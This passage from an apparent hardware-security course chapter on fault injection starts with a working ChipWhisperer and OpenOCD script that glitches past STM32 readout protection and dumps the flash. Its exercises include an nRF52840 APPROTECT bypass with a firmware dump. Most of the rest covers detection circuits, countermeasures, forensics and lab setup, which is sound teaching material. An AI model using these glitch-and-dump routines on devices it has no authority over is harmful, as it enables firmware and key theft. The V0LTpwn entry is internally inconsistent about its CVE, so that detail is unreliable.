# Solder glitch wire to VDD pad (after the shunt resistor)
# Connect SWD lines (SWDIO, SWCLK) to an ST-Link or OpenOCD probe

# Step 2: Identify trigger — use NRST rising edge as trigger
# The RDP check occurs ~200–400 cycles after NRST goes high

# Step 3: Run OpenOCD in background, attempting connection after each glitch
openocd -f interface/stlink.cfg -f target/stm32f1x.cfg \
  -c "init; halt; flash read_image dump.bin 0x08000000 0x20000; shutdown" &
OPENOCD_PID=$!

# Step 4: Python glitch sweep (simplified — see §13 for full CW setup)
```

```python
import chipwhisperer as cw
import subprocess, os, signal

scope  = cw.scope()
scope.clock.clkgen_freq = 8_000_000
scope.trigger.triggers = "nrst"     # trigger on NRST rising edge
scope.glitch.output = "enable_only"

for ext in range(180, 420):
    for width in [w / 10 for w in range(20, 100, 5)]:
        scope.glitch.ext_offset = ext
        scope.glitch.width = width
        scope.arm()
        scope.io.nrst = "low"
        scope.io.nrst = "high"       # release reset — triggers glitch
        scope.capture()

        # Check if SWD is now accessible
        ret = subprocess.run(
            ["openocd", "-f", "interface/stlink.cfg",
             "-f", "target/stm32f1x.cfg",
             "-c", "init; halt; mdw 0x08000000; shutdown"],
            capture_output=True, timeout=3
        )
        if b"0x08000000" in ret.stdout and b"Error" not in ret.stderr:
            print(f"SWD ACCESSIBLE at ext={ext} width={width}")
            # Full dump
            subprocess.run([
                "openocd", "-f", "interface/stlink.cfg",
                "-f", "target/stm32f1x.cfg",
                "-c", "init; halt; flash read_image dump.bin "
                      "0x08000000 0x20000; shutdown"
            ])
            break
    else:
        continue
    break
```

On STM32F1 and STM32F0 series, the RDP check window is narrow (~10 clock cycles) but the boot ROM lacks countermeasures. Success rates of 0.5–3% within the correct parameter range have been reported. STM32F4 and later series add additional countermeasures (redundant RDP checks, boot ROM integrity verification), requiring more precise timing or multi-fault approaches.

### 16.6 Remote and software-induced fault injection — category overview

Software-triggered FI eliminates physical access requirements. §7.1 covers the Plundervolt mechanism (MSR `0x150` voltage manipulation) and §7.2 covers CLKscrew/VoltJockey (DVFS abuse on ARM). Beyond these:

| Attack | Year | Platform | Mechanism | CVE |
|--------|------|----------|-----------|-----|
| Plundervolt | 2019 | Intel SGX | Undervolt via MSR `0x150` | CVE-2019-11157 |
| CLKscrew | 2017 | ARM Cortex-A57 | Overclock via DVFS | CVE-2017-18347 |
| VoltJockey | 2019 | ARM (Kirin/Exynos) | PMIC voltage via I2C/MMIO | — |
| V0LTpwn | 2020 | AMD SEV | Undervolt via MSR `0xC001_0063` | — |
| Platypus | 2020 | Intel (RAPL) | Power side-channel guiding SW FI timing | CVE-2020-8694 |
| PMFault | 2023 | Server BMC→PMBus | Overvolt CPU via PMBus from BMC | CVE-2022-43309 |
| VoltSchemer | 2024 | Qi wireless chargers | EM injection via modified charging signal | — |

**V0LTpwn (CVE-2020-12988)** targets AMD processors running SEV (Secure Encrypted Virtualization). The hypervisor (which AMD's threat model trusts for availability but not confidentiality) uses MSR `0xC001_0063` (`P-state Control`) to undervolt the CPU. Unlike Intel's IA32_OC_MAILBOX, AMD's P-state interface is part of the documented BIOS interface, making the attack surface wider. AMD's mitigation (AGESA firmware update) clamps the minimum voltage to safe operating margins when SEV is active.

**PMFault (CVE-2022-43309)** demonstrates a remote FI vector: server BMCs (Baseboard Management Controllers) communicate with CPU voltage regulators over PMBus (I2C-based). A compromised BMC can write arbitrary voltage values to the VRM (Voltage Regulator Module), physically over- or under-volting the CPU. This converts a BMC compromise into a CPU fault injection capability — the attacker can induce faults in the host OS or hypervisor from the management plane, without any host-side software access.

---

## 17. Fault injection detection and forensics enhancement

### 17.1 Analog voltage/clock monitoring circuit design

Beyond the high-level description in §10.1, this section provides implementation-level detail for custom glitch detection circuits suitable for integration into embedded systems.

**Analog voltage window comparator.** A window comparator using two fast comparators (e.g., TLV3501 — 4.5 ns propagation delay) monitors VCC against upper and lower thresholds set by a resistive voltage divider:

```
VCC ────┬──── R1 ──── VREF_HIGH (e.g., 3.5V for 3.3V rail)
        │            │
        ├─ [+] CMP_H ├──── ALARM_HIGH (active-low, to MCU NMI)
        │  [-]────────┘
        │
        ├─ [−] CMP_L ├──── ALARM_LOW  (active-low, to MCU NMI)
        │  [+]────────┘
        │            │
        └──── R2 ──── VREF_LOW  (e.g., 3.0V for 3.3V rail)

Threshold calculation:
  VREF_HIGH = VCC_nom × 1.06  → detects positive-going spikes
  VREF_LOW  = VCC_nom × 0.91  → detects crowbar glitches

Response time budget:
  Comparator propagation: 4.5 ns (TLV3501)
  PCB trace delay: ~1 ns
  NMI latency (Cortex-M): 12 cycles at 168 MHz ≈ 71 ns
  Total detection-to-halt: ~77 ns

  A 10 ns crowbar glitch completes before the NMI fires.
  Mitigation: couple ALARM_LOW directly to a hardware reset (bypassing
  NMI latency) via an external reset controller (e.g., TPS3808)
  with <1 µs assert time.
```

**Clock frequency monitor.** An FPGA-based or discrete frequency monitor counts target clock edges within a reference time window. If the count deviates beyond a threshold (indicating inserted or missing edges), the monitor asserts a fault signal:

```verilog
// clock_monitor.v — detects inserted/missing clock edges
// Reference: 1 MHz stable oscillator; Target: 8 MHz nominal
module clock_monitor (
    input  wire clk_ref,       // 1 MHz reference
    input  wire clk_target,    // 8 MHz target clock under test
    output reg  fault_detected
);
    reg [3:0] edge_count;
    reg [3:0] ref_div;
    localparam EXPECTED = 4'd8;  // 8 target edges per ref cycle
    localparam MARGIN   = 4'd1;  // allow ±1 edge jitter

    always @(posedge clk_ref) begin
        if (edge_count < (EXPECTED - MARGIN) ||
            edge_count > (EXPECTED + MARGIN))
            fault_detected <= 1'b1;
        else
            fault_detected <= 1'b0;
        edge_count <= 4'd0;
    end

    always @(posedge clk_target) begin
        edge_count <= edge_count + 4'd1;
    end
endmodule
```

This monitor detects both clock glitching (extra edges → count too high) and clock stretching (missing edges → count too low). The reference oscillator must be independent of the target's clock tree — an external crystal oscillator on a separate power domain prevents the attacker from glitching both clocks simultaneously.

### 17.2 Environmental sensor integration and fusion

Individual sensors (voltage, clock, temperature, EM field) each produce false positives under normal operating conditions. Sensor fusion combines multiple indicators to reduce false positives while maintaining detection sensitivity.

**Multi-sensor anomaly scoring.** Each sensor produces a normalized anomaly score (0.0 = nominal, 1.0 = maximum deviation). The fusion engine computes a weighted sum and triggers a response when the composite score exceeds a threshold:

```c
/* sensor_fusion.c — embedded FI detection engine */
#include <stdint.h>
#include <stdbool.h>

typedef struct {
    float voltage_score;    /* from ADC monitoring VCC */
    float clock_score;      /* from frequency counter delta */
    float temp_score;       /* from on-die temperature sensor */
    float em_score;         /* from EM field detector coil */
} sensor_readings_t;

/* Weights tuned per platform — higher weight = higher trust */
static const float W_VOLTAGE = 0.35f;
static const float W_CLOCK   = 0.30f;
static const float W_TEMP    = 0.15f;
static const float W_EM      = 0.20f;

static const float ALERT_THRESHOLD  = 0.45f;  /* soft alert */
static const float LOCKOUT_THRESHOLD = 0.70f;  /* hard lockout */

typedef enum { FI_NOMINAL, FI_ALERT, FI_LOCKOUT } fi_status_t;

fi_status_t evaluate_fi_threat(const sensor_readings_t *s) {
    float composite = s->voltage_score * W_VOLTAGE
                    + s->clock_score   * W_CLOCK
                    + s->temp_score    * W_TEMP
                    + s->em_score      * W_EM;

    if (composite >= LOCKOUT_THRESHOLD) return FI_LOCKOUT;
    if (composite >= ALERT_THRESHOLD)   return FI_ALERT;
    return FI_NOMINAL;
}

void fi_response(fi_status_t status) {
    switch (status) {
        case FI_LOCKOUT:
            zeroize_keys();            /* wipe SRAM key material */
            set_otp_lockout_fuse();    /* permanent disable */
            trigger_hardware_reset();
            break;
        case FI_ALERT:
            increment_tamper_counter(); /* NVM counter */
            log_sensor_snapshot();      /* forensic record */
            if (tamper_counter > MAX_CONSECUTIVE_ALERTS)
                fi_response(FI_LOCKOUT);
            break;
        case FI_NOMINAL:
            break;
    }
}
```

The EM field score is derived from a small pickup coil (2–3 turns, 5 mm diameter) soldered near the target IC, fed through a peak-detect circuit into an ADC channel. A baseline EM level is calibrated during normal operation; deviations beyond 3 standard deviations indicate external EM pulse injection.

### 17.3 Silicon-level damage analysis for FI forensics

When physical evidence of fault injection is suspected, scanning electron microscopy (SEM) and optical beam-induced current (OBIC) analysis can reveal silicon-level damage.

**Latchup damage from EMFI.** High-energy EM pulses can trigger latchup in CMOS circuits — a parasitic thyristor (PNPN path through the substrate) turns on, creating a low-impedance path between VDD and VSS. Sustained latchup current (hundreds of mA through a microscopic region) causes localized thermal damage. Under SEM, latchup sites appear as:

- Melted or discolored metallization (aluminum or copper migration)
- Voids in inter-layer dielectric
- Substrate damage visible in cross-section (junction displacement)

**Laser-induced damage.** Repeated laser FI at the same die location causes cumulative photocurrent damage. Silicon oxidation at the laser spot, visible under infrared microscopy, indicates sustained laser exposure. Single-shot damage is generally not visible, but campaign-scale exposure (thousands of pulses at the same coordinates) produces detectable oxide degradation.

**Power trace anomaly classification for post-mortem analysis.** When a device's power consumption trace has been captured during a suspected FI event, the following pattern taxonomy aids classification:

| Trace pattern | Likely FI type | Confidence |
|---------------|----------------|------------|
| Sharp V-shaped VCC dip, 5–50 ns width | Voltage crowbar glitch | High |
| VCC dip with oscillatory recovery (ringing) | Capacitor-dump glitch | High |
| Narrow current spike with no VCC change | EMFI (induced eddy current) | Medium |
| Clock period anomaly (extra edge in one cycle) | Clock glitch | High |
| Gradual VCC drift over µs timescale | Software DVFS manipulation | Medium |
| Periodic VCC dips synchronized with target reset | Glitch parameter sweep | High |

### 17.4 Error pattern analysis in faulty outputs

When DFA is not the goal but forensic analysis is, the distribution of errors in a collection of faulty outputs reveals the fault injection mechanism:

**Single-byte errors concentrated in one AES column** indicate a round-8 fault targeting MixColumns diffusion — characteristic of a DFA campaign (§8.1). If the faulty ciphertexts were captured from a production device's key-management module, this pattern confirms active DFA exploitation.

**Random multi-byte errors across all state positions** suggest a broad voltage or EM perturbation without precise timing control — characteristic of an attacker in the parameter-search phase (§1.6) who has not yet found the sweet spot.

**Consistent single-bit errors at a fixed position** suggest a stuck-at fault (laser damage or permanent degradation) rather than transient FI. This pattern warrants silicon-level inspection (§17.3).

---

## 18. FI lab advanced setup

### 18.1 Multi-target simultaneous glitching architecture

Production-scale FI evaluation labs (Common Criteria, EMVCo testing) characterize entire device families. Glitching one target at a time is impractical when evaluating 50+ samples for statistical significance. A multi-target architecture multiplexes a single glitch source across multiple target boards:

```
                        ┌─────────────┐
                        │  FPGA       │
                        │  Glitch     │
                        │  Controller │
                        └──┬──┬──┬──┬─┘
                           │  │  │  │   Glitch enable (GPIO)
                    ┌──────┘  │  │  └──────┐
                    ▼         ▼  ▼         ▼
               ┌────────┐ ┌────────┐  ┌────────┐
               │Target 1│ │Target 2│  │Target N│
               │ (CW308)│ │ (CW308)│  │ (CW308)│
               └───┬────┘ └───┬────┘  └───┬────┘
                   │          │           │
                   ▼          ▼           ▼
              UART/SWD    UART/SWD    UART/SWD
              to host     to host     to host
```

Each target board has its own crowbar MOSFET, triggered by a dedicated FPGA output. The FPGA sequences through targets: reset target 1, glitch target 1, read response, move to target 2, etc. With 50 ms per attempt and 8 targets, throughput increases 8× (ideally) or 5–6× (accounting for multiplexing overhead).

The FPGA controller is implemented on a standalone board (Xilinx Artix-7 or Lattice ECP5) with 8+ glitch output channels. Each channel has independent ext_offset and width registers, loaded via SPI from the host PC. A Python orchestrator distributes parameter-sweep ranges across targets:

```python
# multi_target_orchestrator.py — distribute glitch sweep across N targets
import spidev
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor

@dataclass
class TargetConfig:
    channel: int
    uart_port: str
    ext_range: tuple[int, int]
    width_range: tuple[float, float]

def configure_fpga_channel(spi, channel, ext_offset, width_pct):
    """Write glitch parameters to FPGA channel registers via SPI."""
    # Register map: base + channel*8
    base = channel * 8
    ext_bytes = ext_offset.to_bytes(4, "big")
    width_raw = int(width_pct * 100).to_bytes(2, "big")
    spi.xfer2([0x01, base] + list(ext_bytes) + list(width_raw))

def sweep_target(spi, config: TargetConfig):
    results = []
    for ext in range(config.ext_range[0], config.ext_range[1]):
        for width in range(int(config.width_range[0] * 10),
                           int(config.width_range[1] * 10), 5):
            w = width / 10.0
            configure_fpga_channel(spi, config.channel, ext, w)
            trigger_and_capture(spi, config.channel)
            resp = read_uart(config.uart_port)
            results.append({"ext": ext, "width": w,
                            "channel": config.channel, "resp": resp})
    return results

targets = [
    TargetConfig(0, "/dev/ttyUSB0", (200, 400), (3.0, 10.0)),
    TargetConfig(1, "/dev/ttyUSB1", (200, 400), (3.0, 10.0)),
    # ... up to N targets
]

spi = spidev.SpiDev(); spi.open(0, 0)
with ThreadPoolExecutor(max_workers=len(targets)) as pool:
    futures = [pool.submit(sweep_target, spi, t) for t in targets]
    all_results = [f.result() for f in futures]
```

### 18.2 Custom FPGA-based glitch generation

While ChipWhisperer provides an excellent integrated platform, some campaigns require capabilities beyond its architecture: sub-nanosecond pulse shaping, multi-channel independent timing, or custom trigger logic. A dedicated FPGA glitch platform provides full control.

**Minimum viable FPGA glitcher — Lattice ECP5 implementation.**

```verilog
// glitch_engine.v — configurable crowbar pulse generator
module glitch_engine (
    input  wire        clk_in,       // system clock (e.g., 100 MHz)
    input  wire        trigger_in,   // external trigger (rising edge)
    input  wire [31:0] ext_offset,   // delay in clock cycles
    input  wire [15:0] pulse_width,  // width in clock ticks
    output reg         glitch_out    // drives MOSFET gate
);
    reg [31:0] delay_cnt;
    reg [15:0] width_cnt;
    reg        armed, firing;

    always @(posedge clk_in) begin
        if (trigger_in && !armed && !firing) begin
            armed     <= 1'b1;
            delay_cnt <= 32'd0;
        end

        if (armed) begin
            delay_cnt <= delay_cnt + 32'd1;
            if (delay_cnt >= ext_offset) begin
                armed   <= 1'b0;
                firing  <= 1'b1;
                width_cnt <= 16'd0;
                glitch_out <= 1'b1;
            end
        end

        if (firing) begin
            width_cnt <= width_cnt + 16'd1;
            if (width_cnt >= pulse_width) begin
                firing     <= 1'b0;
                glitch_out <= 1'b0;
            end
        end
    end
endmodule
```

For sub-nanosecond resolution, the ECP5's ECLK PLL generates 400+ MHz internal clocks, and the ODDRX2F output primitive serializes the glitch pulse with 1.25 ns edge granularity (at 400 MHz). Combined with the IODELAY primitive for fine-tuning, effective resolution reaches ~300 ps — sufficient for targeting individual pipeline stages in modern microcontrollers.

### 18.3 Precision timing: trigger chain design

Accurate fault injection requires a low-jitter trigger chain from the observable event (target reset, UART byte, GPIO toggle) to the glitch pulse. Every element in the chain adds jitter; total jitter must remain below one target clock period for single-cycle precision.

**Trigger chain jitter budget:**

| Element | Typical jitter | Notes |
|---------|---------------|-------|
| GPIO rising edge (target) | <1 ns | Fast CMOS output |
| Coax cable (BNC, 1 m) | <0.1 ns | Negligible propagation variation |
| Schmitt trigger buffer | 0.5–2 ns | Use 74LVC1G17 (0.5 ns) |
| FPGA input sampling | 0–1 clock period | Synchronizer adds 1 cycle worst case |
| FPGA counter chain | 0 ns | Deterministic after synchronization |
| FPGA output to MOSFET gate | <1 ns | Direct pin drive, short trace |
| MOSFET switching | 2–5 ns | Device-dependent (see §1.3) |
| **Total** | **4–10 ns** | Acceptable for 8 MHz targets (125 ns period) |

For faster targets (>50 MHz, <20 ns period), the FPGA synchronizer jitter (1 clock period) becomes the dominant term. Using the trigger signal as the FPGA's clock reference (rather than sampling it asynchronously) eliminates synchronizer jitter but constrains the FPGA design to the target's clock domain.

**Pattern-match trigger for UART-based synchronization:**

```python
# ChipWhisperer SAD (Sum of Absolute Differences) trigger
# Matches a power trace pattern instead of a GPIO edge

scope.trigger.module = "SAD"
scope.SAD.reference = reference_trace[1200:1264]  # 64-sample template
scope.SAD.threshold = 200                         # SAD match threshold
# When the live ADC trace matches the reference pattern within
# the threshold, the trigger fires — no target modification needed
```

### 18.4 Target preparation for FI access

Target preparation for fault injection involves board-level modifications that maximize glitch coupling while maintaining target functionality. This section covers FI-specific preparation; for chip decapsulation procedures (required for laser and BBI FI), see Domain 17C.

**VCC rail isolation.** Identify all power planes and decoupling capacitors using the board schematic or by tracing with a multimeter in continuity mode. Remove decoupling caps iteratively (starting with the largest bulk caps, then progressively removing ceramics) while verifying target functionality after each removal. Document each removed component's designator, value, and location for reproducibility.

**Trigger point installation.** Solder a fine-gauge wire (30 AWG) to a GPIO pin that toggles at a known point in the boot sequence. For targets where firmware modification is not possible, use the NRST pin's rising edge or the first UART TX byte as a trigger. Route the trigger wire to a BNC connector mounted on the edge of the target board for clean connection to the glitch platform.

**EM probe access.** For EMFI, the probe must be positioned within 1–3 mm of the die surface. On QFP packages, the die is typically 0.5–1.5 mm below the package surface — the probe can be positioned on top of the package. On BGA packages, the die faces downward; access requires either removing the heat spreader (if present) or probing from the PCB backside after removing the solder balls and reballing (see Domain 17C §2 for BGA rework). Mark the die location on the package surface using X-ray imaging or the package's thermal map (hot spot = die location).

### 18.5 Safety protocols

**Laser safety.** Laser fault injection uses Class 3B (5–500 mW) or Class 4 (>500 mW) near-infrared lasers. Mandatory precautions per IEC 60825-1:

- Designated laser area with warning signs and interlocked doors
- Wavelength-appropriate laser safety eyewear (OD5+ at 1064 nm)
- Beam enclosure around the optical path when not actively aligning
- Written SOPs reviewed and signed by all lab personnel
- Laser safety officer (LSO) designated per institutional policy
- Never operate the laser above the microscope objective without the beam dump in place

**High-voltage handling.** PicoEMP and ChipSHOUTER use capacitor banks charged to 200–400V. The discharge pulse is low-energy (microjoules) but the capacitor bank stores lethal charge at high voltage. Standard precautions:

- Discharge capacitor banks before handling the probe or modifying connections
- Use a bleeder resistor (1 MΩ across the bank) to prevent residual charge
- Verify discharge with a voltmeter before physical contact
- ESD wrist strap grounded to the bench, not to the target circuit

---

## 19. Emerging FI research and countermeasures

### 19.1 Fault injection on neural network accelerators

Deep neural network (DNN) accelerators (NPUs, TPUs, custom ASIC inference engines) are increasingly deployed in safety-critical systems (autonomous driving, medical imaging). FI on these accelerators targets the MAC (multiply-accumulate) arrays during inference, causing misclassification.

**Adversarial weight perturbation via FI.** A voltage glitch during weight loading from SRAM to the MAC array corrupts one or more weight values. Unlike adversarial input perturbation (which modifies the input image), weight perturbation is persistent — every subsequent inference uses the corrupted weights. A single-bit flip in a critical weight of a classification network's final fully-connected layer can shift the decision boundary, causing systematic misclassification of specific classes.

Research (Rakin et al., "Bit-Flip Attack," ICCV 2019) demonstrated that flipping as few as 13 bits in a quantized ResNet-18 model (INT8 weights) can cause targeted misclassification with >90% success rate. The most vulnerable weights are those with the largest magnitude in the final layers — they contribute most to the classification score, and a bit flip in their MSB has the largest effect.

**FI countermeasures for neural accelerators:**

- Weight checksumming: CRC-32 over each layer's weight tensor, verified before inference. Overhead: <0.1% compute, ~4 bytes per tensor.
- Dual-inference comparison: run inference twice on separate hardware paths, compare outputs. Overhead: 2× compute, but parallelizable on multi-core NPUs.
- Gradient-based anomaly detection: after FI, the loss landscape changes; monitoring the model's confidence score on a set of reference inputs detects weight corruption.

### 19.2 Photon emission analysis for FI target identification

Before injecting faults, the attacker must locate the target circuitry on the die. Traditional approaches use power trace analysis (SPA) or register-transfer-level (RTL) simulation. Photon emission microscopy (PEM) provides a complementary approach.

When CMOS transistors switch, they emit photons in the near-infrared range (900–1100 nm for 65 nm processes and larger). A sensitive InGaAs camera positioned on the backside of a thinned die captures the emission map, revealing which transistor regions are active during a specific operation.

**FI targeting workflow using PEM:**

1. Thin the die backside to <100 µm (see Domain 17C for backside preparation).
2. Run the target operation (e.g., AES encryption) while capturing the PEM image.
3. Overlay the PEM activity map on the die layout (obtained from delayering and SEM imaging, or from GDSII if available).
4. Identify the active region corresponding to the AES SubBytes operation (brightest during the substitution cycle).
5. Position the laser FI beam on that region for single-byte fault injection.

PEM spatial resolution is diffraction-limited (~0.5 µm at 1064 nm through silicon), matching the precision of laser FI. This combination — PEM for targeting, laser FI for fault injection — is the state of the art for attacking specific logic blocks in complex SoCs.

### 19.3 Advanced countermeasures

**Instruction-level temporal redundancy.** Beyond re-execution and comparison (§10.2), recent work interleaves two redundant computation streams at the instruction level. The compiler emits each operation twice, using different registers, with comparison instructions inserted every N operations. A single glitch corrupts one instruction in one stream; the next comparison detects the discrepancy. This approach has ~60% code size overhead but catches faults within N instructions of occurrence — significantly faster than post-computation comparison.

**Sensor fusion with machine-learning classifiers.** Rather than fixed thresholds (§17.2), an ML model trained on labeled sensor data (voltage, clock, temperature, EM — with and without FI) classifies the sensor vector in real-time. A lightweight decision tree or random forest, running on a companion MCU or the secure element's spare compute capacity, achieves >99% detection rate with <0.1% false positive rate in published evaluations (Shao et al., CHES 2022). The model adapts to manufacturing variation by calibrating per-device during provisioning.

**Formal verification of FI resistance.** Model-checking tools (e.g., using SAL or NuSMV) verify that a hardware design tolerates single-fault injection in any one flip-flop without producing an exploitable state transition. The design is modeled as a finite state machine; the checker exhaustively tests all possible single-bit fault locations at every clock cycle and verifies that no fault path leads to an insecure state (e.g., bypassed authentication, exposed key material). Practical for small designs (up to ~10,000 flip-flops); for larger designs, bounded model checking limits the search depth.

### 19.4 Post-quantum cryptography FI resilience

Lattice-based cryptographic schemes (CRYSTALS-Kyber, CRYSTALS-Dilithium) selected by NIST for post-quantum standardization introduce new FI attack surfaces:

**NTT (Number Theoretic Transform) fault attacks.** Kyber and Dilithium rely on the NTT for polynomial multiplication. A fault during the NTT butterfly operation corrupts one coefficient, which — analogous to DFA on AES MixColumns — propagates through subsequent butterfly stages. Bindel et al. (2023) demonstrated that a single-coefficient fault in Dilithium's NTT allows recovery of the signing key from ~200 faulty signatures, using a lattice-reduction attack on the fault equations.

**Decapsulation oracle via FI.** Kyber's IND-CCA2 security relies on the Fujisaki-Okamoto (FO) transform, which includes a re-encryption check. A glitch that skips the re-encryption comparison converts the IND-CCA2 scheme into an IND-CPA scheme, enabling chosen-ciphertext attacks that recover the secret key. This is directly analogous to secure-boot bypass via branch skip (§1.7) — the same instruction-skip fault model applies.

**Countermeasures specific to PQC:**

- NTT checksumming: verify that the NTT output, when inverse-NTT'd, matches the input. Overhead: one extra NTT computation (~50% increase in polynomial multiplication cost).
- FO transform redundancy: perform the re-encryption check twice with diversified code paths (§10.2 applied to the FO comparison).
- Coefficient range checks: after each NTT stage, verify that coefficients remain within the expected modular range. Out-of-range values indicate fault corruption.

---

## 20. Cross-references

**To Domain 17A (side-channel analysis).** SPA identifies the target operation's timing (§7.1 — locating AES round boundaries for DFA, §8.2 — identifying the Option Byte read in STM32 boot for RDP bypass glitching). DPA/CPA (Chapter 17A §1.1) provides the statistical framework that DFA adapts (correlating a hypothetical intermediate value with observed outputs — in DPA the observation is a power trace, in DFA the observation is a faulty ciphertext). Template attacks (Chapter 17A §1.3) require the same profiling infrastructure that FI characterization uses (a controlled copy of the target device for parameter exploration).

**To Domain 12 (reverse engineering).** Before fault injection, the analyst must understand the target: identify the processor (§3.1 chip identification), extract and analyze the firmware (Chapter 12B §3 for firmware RE), locate the security-critical code (the signature verification function, the RDP check, the APPROTECT read), and determine its timing relative to observable events (power-on, USB enumeration, GPIO toggles). Firmware RE identifies the specific instructions to target with the glitch.

**To Domain 7B (hardware vulnerabilities).** Plundervolt (Chapter 7B §1.3) is a software-triggered voltage fault injection attack: it uses Intel's voltage-scaling interface (MSR `0x150`, `IA32_OC_MAILBOX`) to undervolt the CPU core during SGX enclave execution, inducing faults in the enclave's computation. Plundervolt demonstrates that fault injection can be performed via software on x86 platforms, without physical access to the power supply. Rowhammer (Chapter 7B §2) is a DRAM-based fault injection: repeated reads to a DRAM row induce bit flips in adjacent rows, providing a data-corruption primitive. Both are "remote fault injection" variants that do not require physical proximity.

**To Domain 13 (cryptography).** DFA on AES (§7.1) targets the AES round structure described in Chapter 13A §1.5 (SubBytes, ShiftRows, MixColumns). The Piret-Quisquater attack exploits the MixColumns diffusion to amplify a single-byte fault into four bytes. DFA on RSA-CRT (§7.2) targets the CRT optimization described in Chapter 13A §2.3. The Bellcore attack exploits the mathematical relationship between the CRT components and the factorization of N. DFA on ECC (§7.3) targets scalar multiplication described in Chapter 13A §3.

**To Domain 4B (CET/PAC).** Fault injection can target hardware CFI mechanisms: glitching the PAC verification instruction (AUTIA) could cause it to produce a "pass" result for an invalid PAC, bypassing pointer authentication. Glitching the CET shadow-stack comparison (the #CP-generating comparison between shadow stack and regular stack return addresses) could suppress the exception, allowing a return to an attacker-controlled address. These attacks require physical access to the target and precise timing, but they represent a potential bypass path for hardware CFI on embedded and mobile platforms where the attacker has physical access (e.g., a stolen device, a device in a hostile physical environment). Detection: CET/PAC verification failures should be logged (Domain 4B §10.3 — CET violation telemetry); the absence of expected violations despite anomalous behavior may indicate that FI suppressed the violation mechanism.

---

## 21. Exercises

**Exercise 17.2-1 — ChipWhisperer voltage glitching: instruction skip on STM32F3.**
Using a ChipWhisperer-Husky and CW308 target board with STM32F3 target module: (a) Load the `simpleserial-glitch` firmware that implements a password-comparison loop. (b) Capture a baseline power trace during a failed authentication attempt — identify the comparison instruction's timing from the trace profile. (c) Perform a coarse offset sweep (width=40%, ext_offset range 0–5000) to locate the approximate clock cycle of the comparison. (d) Perform a fine sweep (offset ±100 cycles, width 10%–80%) and generate a 2D glitch map (width vs. offset, color-coded by outcome: success/crash/normal). (e) Demonstrate a repeatable instruction-skip glitch that bypasses the password check — document the successful (width, offset, repeat) tuple, the success rate over 100 attempts, and the crash rate. Deliverable: glitch map visualization, parameter tuple, success/crash statistics, and a power trace annotated with the glitch timing.

**Exercise 17.2-2 — Electromagnetic fault injection with PicoEMP: EM cartography.**
Using a PicoEMP (assembled or DIY build) and an X-Y positioning stage: (a) Mount a target microcontroller (STM32F4 or equivalent) on the stage. Configure the PicoEMP for 250V pulse. (b) Run the `simpleserial-aes` firmware performing AES-128 encryption. (c) Perform an EM cartography scan: define a 10×10 mm grid with 0.5 mm resolution (400 positions), inject 5 pulses per position, classify each response (correct/faulty/reset/mute). (d) Generate the EM susceptibility heatmap overlaid on a chip package photograph. Identify the hot spot (highest success-rate position). (e) At the hot spot, perform a fine-grained timing sweep (ext_offset scan) to find the exact clock cycle for targeting AES round 8 (for DFA). Deliverable: EM cartography JSON data file, heatmap visualization, hot-spot coordinates, and the timing-sweep results with annotated power trace.

**Exercise 17.2-3 — Differential Fault Analysis on AES-128 (Piret-Quisquater).**
Using a ChipWhisperer-Husky with an AES-128 target (CW308 STM32 or XMEGA): (a) Collect 5 pairs of (correct ciphertext, faulty ciphertext) where the fault is injected during AES round 8 using the glitch parameters identified in Exercise 17.2-1 or 17.2-2. (b) Implement the Piret-Quisquater DFA attack in Python: for each faulty ciphertext, compute ΔC = C ⊕ C', identify the affected column (4 non-zero bytes), and reduce the key candidates per byte to ~2^8 using the MixColumns differential property. (c) Intersect candidates across multiple faulty ciphertexts to recover the full 128-bit round-10 key. (d) Derive the original AES-128 key by reversing the key schedule. (e) Verify the recovered key by encrypting a test plaintext and comparing with the correct ciphertext. Deliverable: the DFA Python implementation, the faulty ciphertext pairs, the key-recovery intermediate results (candidate sets per column), and the verified recovered key.

**Exercise 17.2-4 — Secure boot bypass: nRF52840 APPROTECT voltage glitch.**
Using a ChipWhisperer-Husky or custom FPGA glitcher with an nRF52840-DK: (a) Verify that APPROTECT is enabled: attempt an SWD connection with pyOCD and confirm a FAULT response. Read the UICR register at 0x10001208 — it should return the protected value 0x00. (b) Profile the boot power trace: identify the timing of the APPROTECT fuse read during the first 10 µs after reset release. (c) Automate the glitch-and-probe loop: for each (ext_offset, width) combination, toggle RESET, inject the glitch, and immediately attempt an SWD DPIDR read. If the DPIDR read succeeds, read DBGAUTHSTATUS at 0xE000EFB8 to confirm debug is unlocked. (d) Upon successful bypass: dump the full 1 MB flash image via pyOCD (`savemem 0x00000000 0x100000 firmware.bin`). (e) Document: the successful glitch parameters, the number of attempts required, the success rate, and a risk assessment of this bypass on production devices. Deliverable: boot power trace with annotated glitch timing, glitch parameters, firmware dump, and risk assessment.

**Exercise 17.2-5 — Countermeasure evaluation: sensor-based fault detection.**
Using a target board with an integrated voltage glitch detector (or by implementing software-based detection on an STM32): (a) Implement a Brown-Out Reset (BOR) threshold monitor: configure the STM32's BOR level to the tightest setting (BOR Level 3, ~2.7V threshold on STM32F4). Attempt the voltage glitch from Exercise 17.2-1 — document whether the BOR triggers a reset before the glitch causes a useful fault. (b) Implement a software-based clock-cycle counter check: before and after the security-critical comparison, read the SysTick counter and verify that the elapsed cycles match the expected value (±1 cycle tolerance). A glitch that causes an instruction skip changes the cycle count. (c) Implement instruction redundancy: duplicate the comparison instruction (compare twice, AND the results, branch only if both comparisons pass). Attempt the single-glitch bypass — document whether the redundant check prevents the bypass (the attacker must now skip two instructions). (d) Assess the combined countermeasure effectiveness and recommend the minimum countermeasure set for FIPS 140-3 Level 3 vs. Level 4. Deliverable: countermeasure implementation code, glitch test results for each countermeasure, and the FIPS 140-3 recommendation.

---

## 22. Readings and References

- NewAE Technology, "ChipWhisperer Documentation and Tutorials," https://chipwhisperer.readthedocs.io/ (retrieved: 2026-05-29)
- NewAE Technology, "ChipWhisperer GitHub — Tutorials," https://github.com/newaetech/chipwhisperer-jupyter (retrieved: 2026-05-29)
- O'Flynn, Colin, "PicoEMP — Open-Source Electromagnetic Fault Injection Tool," https://github.com/newaetech/chipshouter-picoemp (retrieved: 2026-05-29)
- Piret, Gilles and Quisquater, Jean-Jacques, "A Differential Fault Attack Technique against SPN Structures, with Application to the AES and Khazad," CHES 2003
- Boneh, Dan, DeMillo, Richard A., and Lipton, Richard J., "On the Importance of Checking Cryptographic Protocols for Faults," Eurocrypt 1997
- Murdock, Kit et al., "Plundervolt: Software-based Fault Injection Attacks against Intel SGX," IEEE S&P 2020, CVE-2019-11157
